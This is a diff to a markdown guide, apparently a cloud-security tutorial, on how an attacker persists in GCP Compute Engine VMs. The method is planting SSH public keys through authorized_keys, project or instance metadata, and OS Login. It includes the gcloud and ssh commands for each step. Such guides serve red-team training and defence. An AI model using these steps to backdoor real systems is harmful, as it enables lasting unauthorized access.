@@ -36,6 +36,10 @@ Below is a attached Image which expalain the overall process discussed above.
 
 ![2](https://drive.google.com/uc?id=1tQlyvvaqqb6gyIm0Ht_7pzFmEQxEVaQ6)
 
+Once the attacker has successfully associated their SSH public key with either a user or service account in GCP, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. 
+
+This is why it's considered a form of persistence; the attacker has essentially created a backdoor for themselves.
+
 ### Method 1: Attacker Logs into the VM directly and adds Public Key(s) to be able to login later or persist.
 
 **Scenario:** The Attacker has successfully gained access to the VM (let's say instance-1) through some vulnerability, misconfiguration or even legitimate means and now wants to maintain the access / persist.
@@ -56,7 +60,7 @@ Below is a attached Image which expalain the overall process discussed above.
     echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
     ```
 
-3. The Attacker can now login to the Instance.
+3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
@@ -89,7 +93,7 @@ Below is a attached Image which expalain the overall process discussed above.
     gcloud compute project-info add-metadata --metadata-from-file ssh-keys=~/.ssh/id_rsa.pub
     ```
 
-3. The Attacker can now login to the Instance.
+3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
@@ -121,7 +125,7 @@ Below is a attached Image which expalain the overall process discussed above.
     gcloud compute instances add-metadata INSTANCE_NAME --metadata-from-file ssh-keys=~/.ssh/id_rsa.pub
     ```
     
-3. The Attacker can now login to the Instance.
+3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
@@ -135,6 +139,10 @@ Below is a attached Image which expalain the overall process discussed above.
 # Persisting in Compute Engine VMs with OS Login Enabled
 
 ![3](https://drive.google.com/uc?id=1BtgN1rPOh9wHA5SU-uFauv6a9NnB1pRi)
+
+Once the attacker has successfully associated their SSH public key with either a user or service account in GCP, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. 
+
+This is why it's considered a form of persistence; the attacker has essentially created a backdoor for themselves.
 
 ### Method 1: Attacker Logs into the VM (instance-1) directly via certain means, creates .ssh/authorized_keys file in HOME dir. and adds Public Key(s) to be able to login / persist.
 
@@ -162,7 +170,7 @@ Below is a attached Image which expalain the overall process discussed above.
     echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
     ```
 
-4. The Attacker can now login to the Instance.
+4. The Attacker can now login to the Instance from anywhere without needing to authenticate to GCP or have access to a valid User / Service Account.
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
@@ -210,13 +218,13 @@ Below is a attached Image which expalain the overall process discussed above.
     gcloud compute os-login ssh-keys list
     ```
 
-5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance.
+5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [POSIX_USERNAME]@[EXTERNAL_IP]
     ```
 
-6. Attacker can revoke the associated Public Key from the Google Cloud User Account.
+6. Attacker can revoke the associated Public Key from the Google Cloud User Account if they want:
 
     ```powershell
     gcloud compute os-login ssh-keys list    
@@ -265,13 +273,13 @@ Below is a attached Image which expalain the overall process discussed above.
     gcloud compute os-login ssh-keys list
     ```
 
-5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance:
+5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.
 
     ```powershell
     ssh -i ~/.ssh/id_rsa [POSIX_USERNAME]@[EXTERNAL_IP]
     ```
 
-6. Attacker can revoke the associated Public Key from the Google Cloud Service Account:
+6. Attacker can revoke the associated Public Key from the Google Cloud Service Account if they want:
     
     ```powershell
     gcloud compute os-login ssh-keys list    
